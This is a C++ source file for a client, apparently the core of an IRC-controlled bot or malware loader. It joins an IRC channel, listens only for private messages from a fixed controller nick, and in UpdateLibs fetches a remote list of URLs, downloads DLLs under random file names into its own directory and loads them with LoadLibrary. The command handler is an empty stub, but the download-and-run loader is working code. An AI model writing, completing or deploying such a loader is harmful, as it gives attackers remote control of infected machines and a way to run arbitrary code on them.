#include "stdafx.h"

#include "px_client.h"

#include "native_util.h"
#include "url_helper.h"
#include "px_file.h"

namespace projx {

	void IRC_OnPrivMsg(IRCMessage msg, IRCClient *client) {
		if (msg.prefix.nick != kIrcController) {
			return;
		}
		std::string text = msg.parameters.at(msg.parameters.size() - 1);
	}
	Client::Client() : irc(new IRCClient()), running(false), file_downloader(nullptr) {}
	Client::~Client() {
		running = false;
		UnloadLibs();
		if (irc) {
			delete irc;
			irc = nullptr;
		}
		if (file_downloader) {
			delete file_downloader;
			file_downloader = nullptr;
		}
	}
	void Client::UnloadLibs() {
		for (auto &it : downloaded_libs) {
			if (it.second.temporary) {
				FreeLibrary(it.second.loaded_lib);
			}
		}
		for (auto &it : downloaded_libs) {
			if (it.second.temporary) {
				DeleteFile(it.first.c_str());
			}
		}
		downloaded_libs.clear();
	}
	ProgError Client::Start() {
		if (!file_downloader) {
			file_downloader = new UrlHelper();
		}
		if (!irc->InitSocket() || !irc->Connect((char*)GetIrcParams().host.c_str(), GetIrcParams().port)) {
			return ErrorCodes::kIrcErr;
		}
		std::string display_name;
		ProgError error = GetDisplayName(&display_name);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		if (!irc->Login(display_name, display_name) || !irc->SendIRC(std::string("JOIN ") + GetIrcParams().channel)) {
			return ErrorCodes::kIrcErr;
		}
		irc->HookIRCCommand("PRIVMSG", IRC_OnPrivMsg);
		running = irc->Connected();
		error = UpdateLibs();
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		return ErrorCodes::kSuccess;
	}
	ProgError Client::Stop() {
		if (running) {
			RequestShutdown();
		}
		irc->UnhookCmd("PRIVMSG");
		if (!irc->SendIRC(std::string("PART ") + GetIrcParams().channel) || !irc->SendIRC("QUIT")) {
			return ErrorCodes::kIrcErr;
		}
		if (irc->Connected()) {
			irc->Disconnect();
		}
		if (file_downloader) {
			delete file_downloader;
			file_downloader = nullptr;
		}
		return ErrorCodes::kSuccess;
	}
	ProgError Client::UpdateLibs() {
		if (GetLibListUrl().empty()) {
			return ErrorCodes::kSuccess;
		}
		if (file_downloader == nullptr) {
			return ErrorCodes::kInvalidState;
		}
		UnloadLibs();
		UrlDataBuf url_data;
		ProgError error = file_downloader->DownloadUrl(GetLibListUrl(), &url_data);
		if (error != ErrorCodes::kSuccess) {
			return error;
		}
		char *url_text = new char[url_data.get_data_sz() + 1]{ '\0' };
		if (url_text == nullptr) {
			return ErrorCodes::kOutOfMem;
		}
		memcpy(url_text, url_data.get_data(), url_data.get_data_sz());
		std::stringstream url_stream;
		url_stream << url_text;
		while (url_stream.good()) {
			char entry[1024]{ '\0' };
			url_stream.getline(entry, sizeof(entry));
			const std::string entry_str = StrReplaceAll(entry, "\r", "");
			if (entry_str[0] == '#') {
				continue;
			}
			static constexpr char *kDllListSep = "!";
			size_t name_sep = entry_str.find_first_of(kDllListSep);
			std::string dll_filename, dll_url;
			DownloadedLib library;
			library.loaded_lib = NULL;
			library.temporary = false;
			if (name_sep == std::string::npos) {
				error = StrGenRandom("abcdefghijklmnopqrstuvwxyz0123456789", 4, 9, &dll_filename);
				if (error != ErrorCodes::kSuccess) {
					return error;
				}
				dll_filename += ".dll";
				dll_url = entry_str;
				library.temporary = true;  // TODO Create an actual temporary field in the library list format.
			}
			else {
				dll_filename = entry_str.substr(0, name_sep - 0);
				dll_url = entry_str.substr(name_sep + strlen(kDllListSep));
			}
			std::string current_dir;
			error = GetModuleDirectory(NULL, &current_dir);
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			dll_filename = FileFormatPath(current_dir, true) + "\\" + dll_filename;
			dll_filename = FileFormatPath(dll_filename, true);
			File dll_file(dll_filename);
			if (dll_file.Exists() && !dll_file.CanModify()) {
				continue;
			}
			error = file_downloader->DownloadUrl(dll_url, dll_filename);
			if (error != ErrorCodes::kSuccess) {
				return error;
			}
			HMODULE lib_handle = LoadLibrary(dll_filename.c_str());
			if (lib_handle == NULL) {
				return GetLastError();
			}
			library.loaded_lib = lib_handle;
			downloaded_libs[dll_filename] = library;
		}
		delete[] url_text;
		return ErrorCodes::kSuccess;
	}
	const std::unordered_map<std::string, DownloadedLib> &Client::get_downloaded_libs() const {
		return downloaded_libs;
	}
	IRCClient *Client::get_irc() {
		return irc;
	}
	void Client::RequestShutdown() {
		running = false;
	}
	bool Client::IsRunning() const {
		return running && irc->Connected();
	}
	UrlHelper *Client::get_file_downloader() const {
		return file_downloader;
	}

}  // namespace projx
